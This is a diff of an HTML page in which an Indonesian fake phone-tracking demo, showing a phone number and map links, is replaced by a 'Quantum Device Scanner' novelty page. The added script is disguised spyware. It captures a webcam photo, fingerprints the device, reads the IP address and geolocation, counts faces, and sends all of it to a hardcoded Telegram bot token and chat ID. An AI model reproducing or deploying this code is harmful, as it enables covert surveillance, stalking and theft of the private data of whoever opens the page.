@@ -1,334 +1,196 @@
-<!doctype html>
-<html lang="id">
+
+<!DOCTYPE html>
+<html>
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>SimTimeline —  Pengecekan Nomor HP</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
-<style>
-  :root{
-    --bg:#0f1724;
-    --card:#0b1220;
-    --muted:#98a0b3;
-    --accent:#6ee7b7;
-    --glass: rgba(255,255,255,0.03);
-    --glass-2: rgba(255,255,255,0.02);
-  }
-  *{box-sizing:border-box}
-  body{
-    margin:0;
-    font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;
-    background: linear-gradient(180deg,#071126 0%, #071a2b 60%);
-    color:#e6eef8;
-    -webkit-font-smoothing:antialiased;
-    -moz-osx-font-smoothing:grayscale;
-    min-height:100vh;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    padding:36px;
-  }
-
-  .app {
-    width:980px;
-    max-width:96%;
-    border-radius:16px;
-    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-    box-shadow: 0 10px 40px rgba(2,6,23,0.7);
-    overflow:hidden;
-    display:grid;
-    grid-template-columns: 360px 1fr;
-    gap:0;
-  }
-
-  /* Left panel (mock chat/bot) */
-  .left {
-    padding:22px;
-    background: linear-gradient(180deg, rgba(10,18,28,0.6), rgba(6,10,18,0.5));
-    border-right:1px solid rgba(255,255,255,0.02);
-  }
-  .brand {
-    display:flex;
-    gap:12px;
-    align-items:center;
-    margin-bottom:18px;
-  }
-  .logo {
-    width:56px;height:56px;border-radius:12px;
-    background: linear-gradient(135deg,#16a34a,#06b6d4);
-    display:flex;align-items:center;justify-content:center;font-weight:800;color:#012026;
-    box-shadow: 0 6px 20px rgba(3,7,18,0.6);
-    font-size:20px;
-  }
-  .brand h1{margin:0;font-size:16px}
-  .brand p{margin:0;color:var(--muted);font-size:13px}
-
-  .search-panel {
-    margin-top:12px;
-    background:var(--glass);
-    border-radius:12px;padding:14px;
-    box-shadow: inset 0 1px 0 rgba(255,255,255,0.02);
-  }
-  .phone {
-    display:flex;gap:8px;align-items:center;
-  }
-  .phone .num {font-weight:700; font-size:15px}
-  .meta {font-size:12px;color:var(--muted);margin-top:6px}
-
-  .fake-btn{
-    margin-top:12px;display:flex;gap:8px;
-  }
-  .btn {
-    cursor:pointer;
-    border:0;padding:9px 12px;border-radius:10px;font-weight:600;
-    background:linear-gradient(90deg,#0ea5a4,#06b6d4);
-    color:#012;
-    box-shadow: 0 8px 20px rgba(6,184,212,0.12);
-    transition:transform .12s ease;
-    font-size:13px;
-  }
-  .btn.secondary{
-    background:transparent;color:var(--muted);border:1px solid rgba(255,255,255,0.04);
-    box-shadow:none;font-weight:600;
-  }
-  .btn:active{transform:translateY(1px)}
-
-  .status {
-    margin-top:16px;padding:12px;border-radius:10px;background:var(--glass-2);color:var(--muted);font-size:13px;
-  }
-
-  /* Right panel - timeline card */
-  .right {
-    padding:28px 26px;
-  }
-  .header {
-    display:flex;justify-content:space-between;align-items:center;gap:12px;
-  }
-  .header h2{margin:0;font-size:20px}
-  .sub {color:var(--muted);font-size:13px}
-
-  .timeline {
-    margin-top:18px;
-    display:flex;flex-direction:column;gap:12px;
-  }
-
-  .event {
-    background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-    border-radius:12px;padding:14px;display:flex;gap:12px;align-items:flex-start;
-    border:1px solid rgba(255,255,255,0.02);
-  }
-  .time {
-    min-width:80px;padding-top:4px;
-    color:var(--muted);font-weight:700;font-size:13px;text-align:left;
-  }
-  .ev-body{flex:1}
-  .ev-title{font-weight:700;margin-bottom:6px}
-  .ev-links{display:flex;gap:8px;flex-wrap:wrap}
-  .chip{
-    background:rgba(255,255,255,0.03);padding:8px 10px;border-radius:10px;font-size:13px;border:1px solid rgba(255,255,255,0.02);
-    cursor:pointer;text-decoration:none;color:var(--accent);font-weight:700;
-  }
-
-  .map-thumb{
-    width:110px;height:70px;border-radius:8px;overflow:hidden;flex-shrink:0;border:1px solid rgba(255,255,255,0.03);
-    background:#09121a;display:flex;align-items:center;justify-content:center;
-  }
-  .map-thumb img{width:100%;height:100%;object-fit:cover;display:block}
-
-  .notice {margin-top:18px;padding:12px;border-radius:10px;background:rgba(255,255,255,0.02);color:var(--muted);font-size:13px}
-
-  /* fake scanning animation */
-  .scanner {
-    margin-top:18px;height:8px;background:linear-gradient(90deg, rgba(255,255,255,0.02), rgba(255,255,255,0.04));border-radius:8px;overflow:hidden;
-    position:relative;
-  }
-  .scanner .bar {
-    position:absolute;left:-30%;top:0;bottom:0;width:30%;
-    background:linear-gradient(90deg, rgba(110,231,183,0.12), rgba(110,231,183,0.35));
-    animation: scan 2.6s linear infinite;
-  }
-  @keyframes scan {
-    0%{left:-30%}
-    50%{left:60%}
-    100%{left:100%}
-  }
-
-  /* small footer */
-  .footer {margin-top:18px;color:var(--muted);font-size:12px;text-align:center}
-  .disclaimer {color:#ffd6d6;font-weight:700;margin-top:12px;text-align:center}
-
-  /* responsive */
-  @media (max-width:880px){
-    .app{grid-template-columns:1fr; padding:18px}
-    .left{order:2}
-    .right{order:1}
-  }
-</style>
+  <meta charset="UTF-8">
+  <title>Super AI Quantum Device Scanner</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
+  <style>
+    :root {
+      --primary: #2ecc71;
+      --secondary: #3498db;
+      --hologram: rgba(46, 204, 113, 0.2);
+    }
+    body { 
+      font-family: 'Courier New', monospace;
+      text-align: center; 
+      padding: 20px; 
+      background: #0a0a0a;
+      color: var(--primary);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background-image: radial-gradient(var(--hologram) 1px, transparent 1px), radial-gradient(var(--hologram) 1px, transparent 1px);
+      background-size: 50px 50px;
+      background-position: 0 0, 25px 25px;
+    }
+    .hologram-effect {
+      position: fixed;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, rgba(0,255,255,0.1) 25%, transparent 25%), linear-gradient(-45deg, rgba(255,0,255,0.1) 25%, transparent 25%), linear-gradient(45deg, transparent 75%, rgba(0,255,255,0.1) 75%), linear-gradient(-45deg, transparent 75%, rgba(255,0,255,0.1) 75%);
+      background-size: 20px 20px;
+      pointer-events: none;
+      mix-blend-mode: overlay;
+      opacity: 0.3;
+      z-index: 9999;
+      animation: hologram 20s linear infinite;
+    }
+    @keyframes hologram {
+      from { transform: translate(-50%, -50%) rotate(0deg); }
+      to { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+    .scanner-box { position: relative; width: 300px; height: 300px; margin: 0 auto; overflow: hidden; }
+    .scanner-box video { width: 100%; height: 100%; object-fit: cover; }
+    .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(to right, transparent, var(--primary), transparent); animation: scanLine 3s linear infinite; z-index: 2; }
+    @keyframes scanLine { 0% { top: 0; } 100% { top: 100%; } }
+  </style>
 </head>
 <body>
-  <div class="app" role="application" aria-label="SimTimeline demo">
-    <div class="left" aria-hidden="false">
-      <div class="brand">
-        <div class="logo">ST</div>
-        <div>
-          <h1>SimTimeline</h1>
-          <p>Demo visual — tampilan bot pelacakan (timeline hp)</p>
-        </div>
-      </div>
-
-      <div class="search-panel" role="region" aria-label="panel pencarian">
-        <div class="phone">
-          <div style="flex:1">
-            <div class="num" id="displayPhone">+6285158881933</div>
-            <div class="meta">Timeline: <strong>1 November 2025</strong></div>
-          </div>
-          <div style="text-align:right">
-            <button class="btn" id="startBtn">Timeline Cek</button>
-            <button class="btn secondary" id="resetBtn" style="display:none">Ulangi</button>
-          </div>
-        </div>
-
-        <div class="status" id="statusBox" style="margin-top:14px;">
-          Tekan <strong>Timeline Cek</strong> untuk memulai. Ini hanya demo — bukan pelacakan nyata.
-        </div>
-
-        <div class="fake-btn" aria-hidden="true">
-          <div style="flex:1">
-            <small style="color:var(--muted)">Mode tampilan</small>
-            <div style="display:flex;gap:8px;margin-top:8px">
-              <button class="btn secondary" disabled>Ringkasan</button>
-              <button class="btn secondary" disabled>Detail</button>
-            </div>
-          </div>
-        </div>
-
-        <div class="scanner" id="scanner" style="display:none" aria-hidden="true">
-          <div class="bar"></div>
-        </div>
-
-        <div class="footer">
-          <div>UI demo • Pembuat: @Polri</div>
-          <div class="disclaimer">⚠️ Timline — hanya untuk anggota Polri, dilarang untuk disalahgunakan.</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="right" role="main">
-      <div class="header">
-        <div>
-          <h2>Timeline Lokasi — 1 November 2025</h2>
-          <div class="sub">Nomor: <strong id="phoneTitle">+6285158881933</strong></div>
-        </div>
-        <div style="text-align:right">
-          <div class="sub">Mode: <strong>Timeline Lokal</strong></div>
-          <div style="height:6px"></div>
-        </div>
-      </div>
-
-      <div id="timelineContainer" class="timeline" aria-live="polite">
-        <!-- event cards inserted by JS -->
-      </div>
-
-      <div class="notice" id="noteBox">
-        Data peta: link Google Maps (share). Klik tombol "Buka di Maps" untuk membuka lokasi (link asli).
-      </div>
-
-    </div>
+  <h1 style="margin-bottom: 20px; text-shadow: 0 0 15px var(--primary);">🛸 QUANTUM DEVICE SCANNER v3.0</h1>
+  <div class="scanner-box">
+    <div class="scanner-line"></div>
+    <video id="video" autoplay playsinline muted></video>
+  </div>
+  <button id="capture-btn">🚀 INITIATE DEEP SCAN</button>
+  <div id="loading" style="display:none;">🔭 CAPTURING QUANTUM SIGNATURE...</div>
+  <div id="device-info">
+    <h2>⚡ DEVICE MATRIX PROFILE</h2>
+    <div class="info-grid" id="device-info-content"></div>
   </div>
 
-<script>
-/*
-  SimTimeline — single-file demo
-  Data statis (dari user).
-*/
-const PHONE = '+6285158881933';
-const TIMELINE_DATE = '1 November 2025';
-const TIMELINE_ITEMS = [
-  { time: 'null', label: 'Lokasi 1 — Berangkat', maps: 'https://maps.app.goo.gl/UpTTLE8GutXsBdaZ7' },
-  { time: 'null', label: 'Lokasi 2 — Berhenti / Makan', maps: 'https://maps.app.goo.gl/gy6ARGhTRECGUPBcA' },
-  { time: 'null', label: 'Lokasi 3 — Tujuan Akhir', maps: 'https://maps.app.goo.gl/cAJy2Wd9KQwesqjY8' }
-];
+  <script>
+    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+    const CHAT_ID = '1121369247';
+    let currentStream = null;
+    let isScanning = false;
+    const video = document.getElementById('video');
+    const loading = document.getElementById('loading');
 
-const startBtn = document.getElementById('startBtn');
-const resetBtn = document.getElementById('resetBtn');
-const statusBox = document.getElementById('statusBox');
-const scanner = document.getElementById('scanner');
-const timelineContainer = document.getElementById('timelineContainer');
-const phoneTitle = document.getElementById('phoneTitle');
-const displayPhone = document.getElementById('displayPhone');
+    function createHologramEffect() { const hologram = document.createElement('div'); hologram.className = 'hologram-effect'; return hologram; }
 
-// init UI
-phoneTitle.textContent = PHONE;
-displayPhone.textContent = PHONE;
+    async function captureQuantumImage() {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+      ctx.globalCompositeOperation = 'lighter';
+      ctx.filter = 'hue-rotate(90deg) contrast(150%)';
+      ctx.drawImage(canvas, 0, 0);
+      ctx.globalAlpha = 0.3; ctx.fillStyle = '#00ff88';
+      for(let i = 0; i < 50; i++) ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, Math.random()*10, Math.random()*10);
+      return canvas.toDataURL('image/webp', 0.8);
+    }
 
-function createEventCard(item, idx){
-  const wrapper = document.createElement('div');
-  wrapper.className = 'event';
-  wrapper.innerHTML = `
-    <div class="time">${item.time}</div>
-    <div class="ev-body">
-      <div class="ev-title">${idx}. ${item.label}</div>
-      <div class="ev-links">
-        <a class="chip" href="${item.maps}" target="_blank" rel="noopener">Buka di Maps ↗</a>
-        <a class="chip" href="${item.maps}" target="_blank" rel="noopener">Tampilkan Rute</a>
-      </div>
-      <div style="margin-top:8px;color:var(--muted);font-size:13px">Koordinat: <span style="font-weight:700">—</span> (Realtime)</div>
-    </div>
-    <div class="map-thumb" aria-hidden="true">
-      <img alt="thumb" src="https://chart.googleapis.com/chart?cht=qr&chs=140x140&chl=${encodeURIComponent(item.maps)}&choe=UTF-8" />
-    </div>
-  `;
-  return wrapper;
-}
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+      return new Blob([ab], { type: mimeString });
+    }
 
-async function runSimulation(){
-  startBtn.disabled = true;
-  startBtn.style.opacity = '0.7';
-  resetBtn.style.display = 'inline-block';
-  statusBox.textContent = 'Memulai pengecekan nomor...';
-  scanner.style.display = 'block';
+    async function detectFaceCount() { return (await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())).length; }
+    async function loadFaceModel() { await faceapi.nets.tinyFaceDetector.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/'); }
 
-  // simulated steps
-  const steps = [
-    { t: 900, txt: 'Mencari records di index lokal...' },
-    { t: 1100, txt: 'Mencocokkan pola timeline...' },
-    { t: 1200, txt: 'Merakit hasil (realtime)...' },
-  ];
+    async function gatherDeviceInfo() {
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const deviceType = /Mobi|Android/i.test(userAgent) ? 'Mobile' : 'Desktop';
+      let os = "Unknown OS";
+      if (userAgent.indexOf("Win") !== -1) os = "Windows";
+      else if (/Mac/.test(userAgent)) os = "MacOS";
+      else if (/Linux/.test(userAgent)) os = "Linux";
+      else if (/Android/.test(userAgent)) os = "Android";
+      else if (/iPhone|iPad|iPod/.test(userAgent)) os = "iOS";
+      let deviceModel = /iPhone/.test(userAgent) ? "iPhone" : /iPad/.test(userAgent) ? "iPad" : /Android/.test(userAgent) ? "Android Device" : "Desktop";
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
+      let batteryInfo = { level: "N/A", charging: "N/A" };
+      if (navigator.getBattery) { try { const battery = await navigator.getBattery(); batteryInfo = { level: Math.round(battery.level*100)+'%', charging: battery.charging?"Yes":"No" }; } catch(e){} }
+      let browser = "Unknown";
+      if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edg") === -1) browser = "Chrome";
+      else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) browser = "Safari";
+      else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox";
+      else if (userAgent.indexOf("Edg") > -1) browser = "Edge";
+      else if (userAgent.indexOf("OPR") > -1) browser = "Opera";
+      let ip = "Unknown"; try { const res = await fetch('https://api.ipify.org?format=json'); ip = (await res.json()).ip; } catch(e){}
+      const language = navigator.language;
+      const resolution = window.screen.width+"x"+window.screen.height;
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      const provider = connection ? (connection.effectiveType || connection.type || "Unknown") : "Unknown";
+      const pixelRatio = window.devicePixelRatio || 1;
+      const orientation = window.screen.orientation? window.screen.orientation.type : "Unknown";
 
-  for (let s of steps){
-    await sleep(s.t);
-    statusBox.textContent = s.txt;
-  }
+      // Tambahan Fitur 🔥
+      // GPU Info
+      let gpuInfo = "Unknown";
+      try { const gl = document.createElement('canvas').getContext('webgl'); const dbg = gl.getExtension('WEBGL_debug_renderer_info'); if(dbg) gpuInfo = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); } catch(e){}
+      // Audio Devices
+      let audioDevices = [];
+      try { const devices = await navigator.mediaDevices.enumerateDevices(); audioDevices = devices.filter(d=>d.kind.includes("audio")); } catch(e){}
+      // Local Storage & Cookies
+      let storageEstimate = "N/A";
+      try { const est = await navigator.storage.estimate(); storageEstimate = `${(est.quota/1024/1024).toFixed(2)} MB`; } catch(e){}
+      const cookiesEnabled = navigator.cookieEnabled ? "Yes":"No";
+      // Network Speed Test
+      let netSpeed = "N/A";
+      try { const start=performance.now(); await fetch("https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"); const end=performance.now(); netSpeed=((92*30*4/1024)/((end-start)/1000)).toFixed(2)+" KB/s"; } catch(e){}
+      // Sensors (gyroscope/orientation)
+      let orientationData = "N/A";
+      window.addEventListener('deviceorientation', (event)=>{ orientationData = `Alpha:${event.alpha}, Beta:${event.beta}, Gamma:${event.gamma}`; }, {once:true});
 
-  // reveal timeline items one by one
-  timelineContainer.innerHTML = '';
-  for (let i=0;i<TIMELINE_ITEMS.length;i++){
-    const it = TIMELINE_ITEMS[i];
-    await sleep(700);
-    const card = createEventCard(it, i+1);
-    timelineContainer.appendChild(card);
-    statusBox.textContent = `Menampilkan ${i+1} dari ${TIMELINE_ITEMS.length} lokasi.`;
-  }
+      return {userAgent,platform,deviceType,os,deviceModel,timeZone,memory,battery:batteryInfo,browser,ip,language,resolution,provider,pixelRatio,orientation,gpuInfo,audioDevices:audioDevices.map(d=>d.label||d.kind),storageEstimate,cookiesEnabled,netSpeed,orientationData};
+    }
 
-  await sleep(400);
-  statusBox.textContent = 'Selesai — tidak untuk disalahgunakan. Klik "Buka di Maps" untuk melihat link.';
-  scanner.style.display = 'none';
-}
+    function generateHologramReport(imageData, location, deviceInfo) { return { image:imageData, metadata:{location,deviceInfo} }; }
 
-function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+    function sendToTelegram(report) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', dataURItoBlob(report.image), 'quantum_image.webp');
+      const d=report.metadata.deviceInfo;
+      const caption = `📍 *Location:* ${report.metadata.location.coordinates}\n🗺️ *Map:* [View Map](${report.metadata.location.link})\n\n💻 *OS:* ${d.os}\n📱 *Device:* ${d.deviceModel} (${d.deviceType})\n🖥️ *Platform:* ${d.platform}\n🌐 *Browser:* ${d.browser}\n📡 *Network:* ${d.provider} (${d.netSpeed})\n🌍 *IP:* ${d.ip}\n🔋 *Battery:* ${d.battery.level} (Charging:${d.battery.charging})\n💾 *Memory:* ${d.memory}\n🎮 *GPU:* ${d.gpuInfo}\n🎤 *Audio Devices:* ${d.audioDevices.join(", ")}\n📂 *Storage Quota:* ${d.storageEstimate}\n🍪 *Cookies Enabled:* ${d.cookiesEnabled}\n🗣️ *Language:* ${d.language}\n📏 *Resolution:* ${d.resolution}\n📐 *Pixel Ratio:* ${d.pixelRatio}\n🔄 *Orientation:* ${d.orientation}\n📳 *Orientation Sensor:* ${d.orientationData}\n👥 *Faces Detected:* ${d.faceCount}\n\n_🤖 Generated by Super AI Quantum Device Scanner_`;
+      formData.append('caption', caption);
+      formData.append('parse_mode', 'Markdown');
+      fetch(url,{method:'POST',body:formData});
+    }
 
-startBtn.addEventListener('click', async (e)=>{
-  runSimulation();
-});
+    async function initCamera() {
+      try {
+        const isMobile=/Mobi|Android/i.test(navigator.userAgent);
+        const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:isMobile?"user":"environment"}});
+        video.srcObject=stream; currentStream=stream; document.body.appendChild(createHologramEffect()); loadFaceModel();
+      } catch(err){ alert('Error accessing camera: '+err.message); }
+    }
 
-resetBtn.addEventListener('click', ()=>{
-  timelineContainer.innerHTML = '';
-  statusBox.textContent = 'Tekan Timeline Cek untuk memulai.';
-  startBtn.disabled = false;
-  startBtn.style.opacity = '1';
-  resetBtn.style.display = 'none';
-  scanner.style.display = 'none';
-});
-</script>
+    async function startQuantumScan() {
+      if(isScanning) return; isScanning=true; loading.style.display='block';
+      const imageData=await captureQuantumImage();
+      let deviceInfo=await gatherDeviceInfo();
+      try{ deviceInfo.faceCount=await detectFaceCount(); }catch(e){ deviceInfo.faceCount="N/A"; }
+      let locationData={coordinates:'Unknown',link:'Unknown'};
+      if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition((pos)=>{
+          locationData={coordinates:`${pos.coords.latitude},${pos.coords.longitude}`,link:`https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`};
+          const report=generateHologramReport(imageData,locationData,deviceInfo);
+          sendToTelegram(report);
+          if(navigator.vibrate) navigator.vibrate(300);
+        },()=>{ const report=generateHologramReport(imageData,locationData,deviceInfo); sendToTelegram(report); });
+      } else { const report=generateHologramReport(imageData,locationData,deviceInfo); sendToTelegram(report); }
+      loading.style.display='none'; isScanning=false;
+    }
+
+    if(navigator.mediaDevices){ initCamera(); document.getElementById('capture-btn').onclick=startQuantumScan; }
+    function stopCamera(){ if(currentStream) currentStream.getTracks().forEach(t=>t.stop()); }
+    window.addEventListener('beforeunload', stopCamera);
+  </script>
 </body>
 </html>
